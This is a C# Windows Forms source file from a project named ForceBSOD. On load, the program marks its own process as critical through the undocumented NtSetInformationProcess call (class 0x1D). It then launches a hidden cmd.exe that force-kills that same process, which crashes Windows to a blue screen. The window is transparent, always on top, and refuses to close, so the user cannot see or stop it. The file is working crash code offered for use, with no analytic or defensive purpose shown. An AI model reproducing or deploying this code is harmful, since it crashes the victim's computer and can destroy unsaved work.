using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ForceBSOD
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public Form1()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));

            Process currentProcess = Process.GetCurrentProcess();
            string ProcessID = currentProcess.Id.ToString();
            
            ProcessStartInfo killProcess = new ProcessStartInfo();
            killProcess.FileName = "cmd.exe";
            killProcess.WindowStyle = ProcessWindowStyle.Hidden;
            killProcess.Arguments = @"/c taskkill /f /pid " + ProcessID;
            Process.Start(killProcess);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
